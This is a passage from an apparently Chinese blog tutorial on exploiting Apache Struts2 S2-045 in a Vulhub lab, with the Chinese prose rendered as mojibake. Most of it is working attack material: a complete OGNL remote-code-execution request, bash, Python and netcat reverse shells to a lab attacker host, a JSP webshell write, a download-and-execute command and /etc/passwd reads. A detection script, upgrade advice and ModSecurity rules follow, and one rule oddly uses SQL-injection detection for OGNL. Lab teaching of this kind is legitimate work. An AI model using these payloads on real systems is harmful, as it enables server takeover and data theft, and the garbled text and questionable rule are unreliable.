Windows<span class=\"hljs-symbol\">/Linux</span> <span class=\"hljs-operator\">+</span> BurpSuite<br>â”‚<br>â””â”€ é¶æœºï¼ˆKali VMï¼‰<br>   â”œâ”€ <span class=\"hljs-params\">IP:</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.102</span><br>   â”œâ”€ Docker <span class=\"hljs-operator\">+</span> Vulhub<br>   â””â”€ Struts2 App (Port <span class=\"hljs-number\">8080</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Dockerç¯å¢ƒéƒ¨ç½²\"><a href=\"#Dockerç¯å¢ƒéƒ¨ç½²\" class=\"headerlink\" title=\"Dockerç¯å¢ƒéƒ¨ç½²\"></a>Dockerç¯å¢ƒéƒ¨ç½²</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 1. å…‹éš†Vulhubé¡¹ç›®</span><br>git <span class=\"hljs-built_in\">clone</span> https://github.com/vulhub/vulhub.git<br><br><span class=\"hljs-comment\"># 2. è¿›å…¥S2-045ç›®å½•</span><br><span class=\"hljs-built_in\">cd</span> vulhub/struts2/s2-045<br><br><span class=\"hljs-comment\"># 3. å¯åŠ¨é¶åœº</span><br>docker-compose up -d<br><br><span class=\"hljs-comment\"># 4. éªŒè¯å®¹å™¨çŠ¶æ€</span><br>docker ps -a<br></code></pre></td></tr></table></figure>\n\n<p><strong>é¢„æœŸè¾“å‡º</strong>:</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">CONTAINER</span> ID   IMAGE                   COMMAND       CREATED     STATUS      PORTS                    NAMES<br><span class=\"hljs-attribute\">2363a15cda30</span>   vulhub/struts2:<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">30</span>   <span class=\"hljs-string\">&quot;mvn-server&quot;</span> <span class=\"hljs-number\">2</span>min ago   Up <span class=\"hljs-number\">2</span>min     <span class=\"hljs-number\">0.0.0.0:8080</span>-&gt;<span class=\"hljs-number\">8080</span>/tcp  s2-<span class=\"hljs-number\">045</span>-struts2-<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"ç¯å¢ƒéªŒè¯\"><a href=\"#ç¯å¢ƒéªŒè¯\" class=\"headerlink\" title=\"ç¯å¢ƒéªŒè¯\"></a>ç¯å¢ƒéªŒè¯</h3><p>è®¿é—® <code>http://192.168.56.102:8080/</code> åº”è¯¥èƒ½çœ‹åˆ°Struts2é»˜è®¤é¡µé¢ã€‚</p>\n<h2 id=\"æ¼æ´åˆ©ç”¨å®æˆ˜\"><a href=\"#æ¼æ´åˆ©ç”¨å®æˆ˜\" class=\"headerlink\" title=\"æ¼æ´åˆ©ç”¨å®æˆ˜\"></a>æ¼æ´åˆ©ç”¨å®æˆ˜</h2><h3 id=\"Payloadæ„é€ åŸç†\"><a href=\"#Payloadæ„é€ åŸç†\" class=\"headerlink\" title=\"Payloadæ„é€ åŸç†\"></a>Payloadæ„é€ åŸç†</h3><p>æ¶æ„Content-Typeçš„æ ¸å¿ƒç»“æ„ï¼š</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"><span class=\"hljs-attribute\">Content</span>-Type: %&#123;OGNL_EXPRESSION&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"å®Œæ•´æ”»å‡»è½½è·\"><a href=\"#å®Œæ•´æ”»å‡»è½½è·\" class=\"headerlink\" title=\"å®Œæ•´æ”»å‡»è½½è·\"></a>å®Œæ•´æ”»å‡»è½½è·</h3><figure class=\"highlight smalltalk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs smalltalk\"><span class=\"hljs-type\">GET</span> / <span class=\"hljs-type\">HTTP</span>/<span class=\"hljs-number\">1.1</span><br><span class=\"hljs-type\">Host</span>: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.102</span>:<span class=\"hljs-number\">8080</span><br><span class=\"hljs-type\">User</span>-<span class=\"hljs-type\">Agent</span>: <span class=\"hljs-type\">Mozilla</span>/<span class=\"hljs-number\">5.0</span> (compatible; <span class=\"hljs-type\">MSIE</span> <span class=\"hljs-number\">9.0</span>; <span class=\"hljs-type\">Windows</span> <span class=\"hljs-type\">NT</span> <span class=\"hljs-number\">6.1</span>; <span class=\"hljs-type\">Win64</span>; x64)<br><span class=\"hljs-type\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class=\"hljs-number\">0.9</span>,*/*;q=<span class=\"hljs-number\">0.8</span><br><span class=\"hljs-type\">Connection</span>: close<br><span class=\"hljs-type\">Content</span>-<span class=\"hljs-type\">Type</span>: %&#123;<br>    (<span class=\"hljs-symbol\">#nike</span>=<span class=\"hljs-string\">&#x27;multipart/form-data&#x27;</span>).<br>    (<span class=\"hljs-symbol\">#dm</span>=@ognl.<span class=\"hljs-type\">OgnlContext</span>@<span class=\"hljs-type\">DEFAULT_MEMBER_ACCESS</span>).<br>    (<span class=\"hljs-symbol\">#_memberAccess</span>?(<span class=\"hljs-symbol\">#_memberAccess</span>=<span class=\"hljs-symbol\">#dm</span>):(<br>        (<span class=\"hljs-symbol\">#container</span>=<span class=\"hljs-symbol\">#context</span>[<span class=\"hljs-string\">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>=<span class=\"hljs-symbol\">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.<span class=\"hljs-type\">OgnlUtil</span>@class)).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>.getExcludedPackageNames().clear()).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>.getExcludedClasses().clear()).<br>        (<span class=\"hljs-symbol\">#context</span>.setMemberAccess(<span class=\"hljs-symbol\">#dm</span>))<br>    )).<br>    (<span class=\"hljs-symbol\">#cmd</span>=<span class=\"hljs-string\">&#x27;whoami&#x27;</span>).<br>    (<span class=\"hljs-symbol\">#iswin</span>=(@java.lang.<span class=\"hljs-type\">System</span>@getProperty(<span class=\"hljs-string\">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class=\"hljs-string\">&#x27;win&#x27;</span>))).<br>    (<span class=\"hljs-symbol\">#cmds</span>=(<span class=\"hljs-symbol\">#iswin</span>?&#123;<span class=\"hljs-string\">&#x27;cmd.exe&#x27;</span>,<span class=\"hljs-string\">&#x27;/c&#x27;</span>,<span class=\"hljs-symbol\">#cmd</span>&#125;:&#123;<span class=\"hljs-string\">&#x27;/bin/bash&#x27;</span>,<span class=\"hljs-string\">&#x27;-c&#x27;</span>,<span class=\"hljs-symbol\">#cmd</span>&#125;)).<br>    (<span class=\"hljs-symbol\">#p</span>=new java.lang.<span class=\"hljs-type\">ProcessBuilder</span>(<span class=\"hljs-symbol\">#cmds</span>)).<br>    (<span class=\"hljs-symbol\">#p</span>.redirectErrorStream(<span class=\"hljs-keyword\">true</span>)).<br>    (<span class=\"hljs-symbol\">#process</span>=<span class=\"hljs-symbol\">#p</span>.start()).<br>    (<span class=\"hljs-symbol\">#ros</span>=(@org.apache.struts2.<span class=\"hljs-type\">ServletActionContext</span>@getResponse().getOutputStream())).<br>    (@org.apache.commons.io.<span class=\"hljs-type\">IOUtils</span>@copy(<span class=\"hljs-symbol\">#process</span>.getInputStream(),<span class=\"hljs-symbol\">#ros</span>)).<br>    (<span class=\"hljs-symbol\">#ros</span>.flush())<br>&#125;<br><span class=\"hljs-type\">Content</span>-<span class=\"hljs-type\">Length</span>: <span class=\"hljs-number\">0</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Payloadé€è¡Œè§£æ\"><a href=\"#Payloadé€è¡Œè§£æ\" class=\"headerlink\" title=\"Payloadé€è¡Œè§£æ\"></a>Payloadé€è¡Œè§£æ</h3><table>\n<thead>\n<tr>\n<th>è¡¨è¾¾å¼ç‰‡æ®µ</th>\n<th>åŠŸèƒ½è¯´æ˜</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>#nike=&#39;multipart/form-data&#39;</code></td>\n<td>è®¾ç½®ä¼ªè£…çš„Content-Type</td>\n</tr>\n<tr>\n<td><code>#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code></td>\n<td>è·å–é»˜è®¤æˆå‘˜è®¿é—®æƒé™</td>\n</tr>\n<tr>\n<td><code>#_memberAccess=#dm</code></td>\n<td>ç»•è¿‡Struts2çš„å®‰å…¨é™åˆ¶</td>\n</tr>\n<tr>\n<td><code>#container=#context[...]</code></td>\n<td>è·å–ActionContextå®¹å™¨</td>\n</tr>\n<tr>\n<td><code>#ognlUtil.getExcludedPackageNames().clear()</code></td>\n<td>æ¸…é™¤åŒ…åé»‘åå•</td>\n</tr>\n<tr>\n<td><code>#ognlUtil.getExcludedClasses().clear()</code></td>\n<td>æ¸…é™¤ç±»åé»‘åå•</td>\n</tr>\n<tr>\n<td><code>#cmd=&#39;whoami&#39;</code></td>\n<td>å®šä¹‰è¦æ‰§è¡Œçš„å‘½ä»¤</td>\n</tr>\n<tr>\n<td><code>#iswin=...contains(&#39;win&#39;)</code></td>\n<td>åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹</td>\n</tr>\n<tr>\n<td><code>#cmds=(#iswin?&#123;...&#125;:&#123;...&#125;)</code></td>\n<td>æ ¹æ®ç³»ç»Ÿç±»å‹æ„é€ å‘½ä»¤å‚æ•°</td>\n</tr>\n<tr>\n<td><code>#p=new ProcessBuilder(#cmds)</code></td>\n<td>åˆ›å»ºè¿›ç¨‹æ„å»ºå™¨</td>\n</tr>\n<tr>\n<td><code>#process=#p.start()</code></td>\n<td>å¯åŠ¨è¿›ç¨‹æ‰§è¡Œå‘½ä»¤</td>\n</tr>\n<tr>\n<td><code>IOUtils@copy(...)</code></td>\n<td>å°†å‘½ä»¤è¾“å‡ºå†™å…¥HTTPå“åº”</td>\n</tr>\n</tbody></table>\n<h3 id=\"æ”»å‡»æ•ˆæœæ¼”ç¤º\"><a href=\"#æ”»å‡»æ•ˆæœæ¼”ç¤º\" class=\"headerlink\" title=\"æ”»å‡»æ•ˆæœæ¼”ç¤º\"></a>æ”»å‡»æ•ˆæœæ¼”ç¤º</h3><p><strong>è¯·æ±‚å‘é€åçš„å“åº”</strong>:</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-meta\">HTTP/1.1</span> <span class=\"hljs-number\">200</span> OK<br><span class=\"hljs-attribute\">Server</span><span class=\"hljs-punctuation\">: </span>Apache-Coyote/1.1<br><span class=\"hljs-attribute\">Content-Type</span><span class=\"hljs-punctuation\">: </span>text/html;charset=UTF-8<br><span class=\"hljs-attribute\">Content-Length</span><span class=\"hljs-punctuation\">: </span>9<br><span class=\"hljs-attribute\">Date</span><span class=\"hljs-punctuation\">: </span>Wed, 24 Jul 2025 08:30:45 GMT<br><span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close<br><br><span class=\"language-haskell\"><span class=\"hljs-title\">www</span>-<span class=\"hljs-class\"><span class=\"hljs-keyword\">data</span></span></span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"é«˜çº§åˆ©ç”¨æŠ€å·§\"><a href=\"#é«˜çº§åˆ©ç”¨æŠ€å·§\" class=\"headerlink\" title=\"é«˜çº§åˆ©ç”¨æŠ€å·§\"></a>é«˜çº§åˆ©ç”¨æŠ€å·§</h2><h3 id=\"1-ä¿¡æ¯æ”¶é›†å‘½ä»¤\"><a href=\"#1-ä¿¡æ¯æ”¶é›†å‘½ä»¤\" class=\"headerlink\" title=\"1. ä¿¡æ¯æ”¶é›†å‘½ä»¤\"></a>1. ä¿¡æ¯æ”¶é›†å‘½ä»¤</h3><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs autoit\"><span class=\"hljs-meta\"># ç³»ç»Ÿä¿¡æ¯</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;uname -a&#x27;</span></span><br><br><span class=\"hljs-meta\"># å½“å‰ç”¨æˆ·</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;id&#x27;</span></span><br><br><span class=\"hljs-meta\"># ç½‘ç»œé…ç½®</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ifconfig&#x27;</span></span><br><br><span class=\"hljs-meta\"># è¿›ç¨‹åˆ—è¡¨</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ps aux&#x27;</span></span><br><br><span class=\"hljs-meta\"># æ–‡ä»¶ç³»ç»Ÿ</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ls -la /&#x27;</span></span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-åå¼¹Shell\"><a href=\"#2-åå¼¹Shell\" class=\"headerlink\" title=\"2. åå¼¹Shell\"></a>2. åå¼¹Shell</h3><figure class=\"highlight hsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs hsp\"><span class=\"hljs-meta\"># Bashåå¼¹Shell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;bash -i &gt;&amp; /dev/tcp/<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">4444</span> <span class=\"hljs-number\">0</span>&gt;&amp;<span class=\"hljs-number\">1</span>&#x27;</span><br><br><span class=\"hljs-meta\"># Pythonåå¼¹Shell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;python -c <span class=\"hljs-string\">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;192.168.56.1\\&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);&quot;</span>&#x27;</span><br><br><span class=\"hljs-meta\"># NCåå¼¹Shell  </span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;nc -e /bin/sh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span> <span class=\"hljs-number\">4444</span>&#x27;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-æ–‡ä»¶æ“ä½œ\"><a href=\"#3-æ–‡ä»¶æ“ä½œ\" class=\"headerlink\" title=\"3. æ–‡ä»¶æ“ä½œ\"></a>3. æ–‡ä»¶æ“ä½œ</h3><figure class=\"highlight hsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs hsp\"><span class=\"hljs-meta\"># è¯»å–æ•æ„Ÿæ–‡ä»¶</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;cat /etc/passwd&#x27;</span><br><br><span class=\"hljs-meta\"># å†™å…¥WebShell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;echo <span class=\"hljs-string\">&quot;&lt;%@ page import=\\&quot;java.io.*\\&quot; %&gt;&lt;% String cmd = request.getParameter(\\&quot;cmd\\&quot;); Process p = Runtime.getRuntime().exec(cmd); %&gt;&quot;</span> &gt; /tmp/shell.jsp&#x27;</span><br><br><span class=\"hljs-meta\"># ä¸‹è½½æ–‡ä»¶</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;wget http:<span class=\"hljs-comment\">//192.168.56.1:8000/shell.sh -O /tmp/shell.sh &amp;&amp; chmod +x /tmp/shell.sh &amp;&amp; /tmp/shell.sh&#x27;</span></span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"æ£€æµ‹ä¸é˜²æŠ¤\"><a href=\"#æ£€æµ‹ä¸é˜²æŠ¤\" class=\"headerlink\" title=\"æ£€æµ‹ä¸é˜²æŠ¤\"></a>æ£€æµ‹ä¸é˜²æŠ¤</h2><h3 id=\"æ¼æ´æ£€æµ‹è„šæœ¬\"><a href=\"#æ¼æ´æ£€æµ‹è„šæœ¬\" class=\"headerlink\" title=\"æ¼æ´æ£€æµ‹è„šæœ¬\"></a>æ¼æ´æ£€æµ‹è„šæœ¬</h3><figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs livescript\"><span class=\"hljs-comment\">#!/usr/bin/env python3</span><br><span class=\"hljs-keyword\">import</span> requests<br><span class=\"hljs-keyword\">import</span> sys<br><br>def check_s2_045(url):<br>    payload = <span class=\"hljs-string\">&quot;&quot;&quot;%&#123;</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#nike</span>=&#x27;multipart/form-data&#x27;).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#_memberAccess</span>?(<span class=\"hljs-subst\">#_memberAccess</span>=<span class=\"hljs-subst\">#dm</span>):(</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#container</span>=<span class=\"hljs-subst\">#context</span>[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>=<span class=\"hljs-subst\">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>.getExcludedPackageNames().clear()).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>.getExcludedClasses().clear()).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#context</span>.setMemberAccess(<span class=\"hljs-subst\">#dm</span>))</span><br><span class=\"hljs-string\">        )).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#cmd</span>=&#x27;echo &quot;S2045_VULN_TEST&quot;&#x27;).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#iswin</span>=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#cmds</span>=(<span class=\"hljs-subst\">#iswin</span>?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,<span class=\"hljs-subst\">#cmd</span>&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,<span class=\"hljs-subst\">#cmd</span>&#125;)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#p</span>=new java.lang.ProcessBuilder(<span class=\"hljs-subst\">#cmds</span>)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#p</span>.redirectErrorStream(true)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#process</span>=<span class=\"hljs-subst\">#p</span>.start()).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).</span><br><span class=\"hljs-string\">        (@org.apache.commons.io.IOUtils@copy(<span class=\"hljs-subst\">#process</span>.getInputStream(),<span class=\"hljs-subst\">#ros</span>)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#ros</span>.flush())</span><br><span class=\"hljs-string\">    &#125;&quot;&quot;&quot;</span><br>    <br>    headers = &#123;<br>        <span class=\"hljs-string\">&#x27;Content-Type&#x27;</span>: payload,<br>        <span class=\"hljs-string\">&#x27;User-Agent&#x27;</span>: <span class=\"hljs-string\">&#x27;Mozilla/5.0 (compatible; S2-045-Scanner)&#x27;</span><br>    &#125;<br>    <br>    try:<br>        response = requests.get(url, headers=headers, timeout=<span class=\"hljs-number\">10</span>)<br>        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;S2045_VULN_TEST&quot;</span> <span class=\"hljs-keyword\">in</span> response.text:<br>            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[+] &#123;url&#125; is vulnerable to S2-045!&quot;</span>)<br>            <span class=\"hljs-keyword\">return</span> True<br>        else:<br>            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[-] &#123;url&#125; is not vulnerable to S2-045&quot;</span>)<br>            <span class=\"hljs-keyword\">return</span> False<br>    except Exception <span class=\"hljs-keyword\">as</span> e:<br>        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[!] Error testing &#123;url&#125;: &#123;str(e)&#125;&quot;</span>)<br>        <span class=\"hljs-keyword\">return</span> False<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&quot;__main__&quot;</span>:<br>    <span class=\"hljs-keyword\">if</span> len(sys.argv) != <span class=\"hljs-number\">2</span>:<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;Usage: python3 s2-045-check.py &lt;URL&gt;&quot;</span>)<br>        sys.exit(<span class=\"hljs-number\">1</span>)<br>    <br>    target_url = sys.argv[<span class=\"hljs-number\">1</span>]<br>    check_s2_045(target_url)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"å®‰å…¨é˜²æŠ¤æªæ–½\"><a href=\"#å®‰å…¨é˜²æŠ¤æªæ–½\" class=\"headerlink\" title=\"å®‰å…¨é˜²æŠ¤æªæ–½\"></a>å®‰å…¨é˜²æŠ¤æªæ–½</h3><h4 id=\"1-ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰\"><a href=\"#1-ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰\" class=\"headerlink\" title=\"1. ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰\"></a>1. ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰</h4><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-comment\"># å‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬</span><br><span class=\"hljs-attribute\">Apache</span> Struts <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">32</span>+ æˆ– <span class=\"hljs-number\">2.5.10.1</span>+<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-WAFè§„åˆ™é…ç½®\"><a href=\"#2-WAFè§„åˆ™é…ç½®\" class=\"headerlink\" title=\"2. WAFè§„åˆ™é…ç½®\"></a>2. WAFè§„åˆ™é…ç½®</h4><p><strong>ModSecurityè§„åˆ™</strong>:</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\"><span class=\"hljs-meta\"># æ£€æµ‹S2-045æ”»å‡»ç‰¹å¾</span><br>SecRule REQUEST_HEADERS<span class=\"hljs-punctuation\">:</span>Content<span class=\"hljs-punctuation\">-</span>Type <span class=\"hljs-string\">&quot;@detectSQLi&quot;</span> \\<br>    <span class=\"hljs-string\">&quot;id:1001,\\</span><br>    phase<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">1</span><span class=\"hljs-punctuation\">,</span>\\<br>    block<span class=\"hljs-punctuation\">,</span>\\<br>    msg<span class=\"hljs-punctuation\">:</span>&#x27;Struts2 S2-045 Attack Detected&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    logdata<span class=\"hljs-punctuation\">:</span>&#x27;Content-Type: %&#123;MATCHED_VAR&#125;&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    tag<span class=\"hljs-punctuation\">:</span>&#x27;attack-sqli&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    tag<span class=\"hljs-punctuation\">:</span>&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;<span class=\"hljs-string\">&quot;</span><br><br><span class=\"hljs-meta\"># æ£€æµ‹OGNLè¡¨è¾¾å¼</span><br>SecRule REQUEST_HEADERS<span class=\"hljs-punctuation\">:</span>Content<span class=\"hljs-punctuation\">-</span>Type <span class=\"hljs-string\">&quot;@contains %&#123;&quot;</span> \\<br>    <span class=\"hljs-string\">&quot;id:1002,\\</span><br>    phase<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">1</span><span class=\"hljs-punctuation\">,</span>\\<br>    block<span class=\"hljs-punctuation\">,</span>\\<br>    msg<span class=\"hljs-punctuation\">:</span>&#x27;Potential OGNL Injection in Content-Type&#x27;<span class=\"hljs-string\">&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-ç½‘ç»œå±‚é˜²æŠ¤\"><a href=\"#3-ç½‘ç»œå±‚é˜²æŠ¤\" class=\"headerlink\" title=\"3. ç½‘ç»œå±‚é˜²æŠ¤\"></a>3. ç½‘ç»œå±‚é˜²æŠ¤</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"># 